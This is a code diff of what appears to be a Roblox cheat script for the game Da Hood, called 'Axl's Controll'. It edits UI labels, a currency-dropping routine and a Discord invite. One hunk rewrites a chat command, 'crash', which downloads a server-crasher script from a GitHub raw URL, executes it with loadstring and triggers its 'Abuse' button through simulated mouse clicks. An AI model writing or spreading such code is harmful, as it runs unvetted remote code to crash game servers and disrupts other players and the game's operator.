@@ -634,7 +634,7 @@ if game.PlaceId == 2788229376 then
 
                                     if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value < 10000 then
                                         local args = {
-                                            [1] = "I GOT NO MORE MONEY, Stopped dropping.",
+                                            [1] = "Ran out of money, stopped dropping.",
                                             [2] = "All"
                                         }
 
@@ -688,7 +688,7 @@ if game.PlaceId == 2788229376 then
 
                                     if game:GetService("Players").LocalPlayer.DataFolder.Currency.Value < 10000 then
                                         local args = {
-                                            [1] = "I GOT NO MORE MONEY, Stopped dropping.",
+                                            [1] = "Ran out of money, stopped dropping.",
                                             [2] = "All"
                                         }
 
@@ -942,7 +942,7 @@ if game.PlaceId == 2788229376 then
 
                         if finalMsg == getgenv().prefix .. "crash" then
                             loadstring(game:HttpGet(
-                                'loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()'))()
+                                'https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
                             wait(2)
                             local function firefakesignal(Button)
                                 game:GetService("VirtualInputManager"):SendMouseButtonEvent(Button.AbsolutePosition.X +
@@ -955,7 +955,7 @@ if game.PlaceId == 2788229376 then
                                     Button.AbsolutePosition.Y + Button.AbsoluteSize.Y / 2 + 30, 0, false, yomama, 1)
                             end
 
-                            firefakesignal(game:GetService("CoreGui").SwagmodeCrasher["BDH"].CrashFrame
+                            firefakesignal(game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].CrashFrame
                                                .Abuse)
                         end
 
@@ -1640,7 +1640,7 @@ if game.PlaceId == 2788229376 then
         Rank_16.Position = UDim2.new(0.511275709, 0, 0.365445167, 0)
         Rank_16.Size = UDim2.new(0, 390, 0, 21)
         Rank_16.Font = Enum.Font.Code
-        Rank_16.Text = "crash (REQUIRES A DECENT PC)"
+        Rank_16.Text = "crash (soon)"
         Rank_16.TextColor3 = Color3.fromRGB(220, 220, 220)
         Rank_16.TextSize = 18.000
         Rank_16.TextWrapped = true
@@ -1676,7 +1676,7 @@ if game.PlaceId == 2788229376 then
         Rank_17.Size = UDim2.new(0, 513, 0, 226)
         Rank_17.Font = Enum.Font.Code
         Rank_17.Text =
-            "by axl
+            "This script has been made by axelbopo."
         Rank_17.TextColor3 = Color3.fromRGB(220, 220, 220)
         Rank_17.TextSize = 18.000
         Rank_17.TextWrapped = true
@@ -1745,7 +1745,7 @@ if game.PlaceId == 2788229376 then
         TextBox.ZIndex = 5
         TextBox.Font = Enum.Font.Code
         TextBox.LineHeight = 1.100
-        TextBox.PlaceholderText = "Input Username (case sensative)"
+        TextBox.PlaceholderText = "Input Username (cAsE sEnsItive)"
         TextBox.Text = ""
         TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
         TextBox.TextSize = 14.000
@@ -1825,7 +1825,7 @@ if game.PlaceId == 2788229376 then
         Title_3.Position = UDim2.new(0.123752303, 0, 0.0177514795, 0)
         Title_3.Size = UDim2.new(0, 153, 0, 21)
         Title_3.Font = Enum.Font.Code
-        Title_3.Text = "Axl's Controll"
+        Title_3.Text = "Axl's Controll v1"
         Title_3.TextColor3 = Color3.fromRGB(220, 220, 220)
         Title_3.TextSize = 14.000
         Title_3.TextWrapped = true
@@ -1999,7 +1999,7 @@ if game.PlaceId == 2788229376 then
 
             while wait(5) do
                 
-                text.Text = "- Nothing much just released the script"
+                text.Text = "- everything"
             end
         end
         coroutine.wrap(YQCCP_fake_script)()
@@ -2389,7 +2389,7 @@ if game.PlaceId == 2788229376 then
             TextLabel.Position = UDim2.new(0.379002213, 0, 0.0237247907, 0)
             TextLabel.Size = UDim2.new(0, 325, 0, 54)
             TextLabel.Font = Enum.Font.Code
-            TextLabel.Text = "Axl's Controll"
+            TextLabel.Text = "Axl's Controll v1"
             TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
             TextLabel.TextScaled = true
             TextLabel.TextSize = 14.000
@@ -2400,7 +2400,7 @@ if game.PlaceId == 2788229376 then
             TextButton.Position = UDim2.new(0.161833167, 0, 0.12319342, 0)
             TextButton.Size = UDim2.new(0, 274, 0, 72)
             TextButton.Font = Enum.Font.Code
-            TextButton.Text = " Discord "
+            TextButton.Text = " Copy Discord "
             TextButton.TextColor3 = Color3.fromRGB(220, 220, 220)
             TextButton.TextScaled = true
             TextButton.TextSize = 14.000
@@ -2501,8 +2501,7 @@ if game.PlaceId == 2788229376 then
                 local button = script.Parent
 
                 function leftClick()
-                    setclipboard("https://discord.gg/bdh
-")
+                    setclipboard("https://discord.gg/bdh")
                 end
 
                 button.MouseButton1Click:Connect(leftClick)
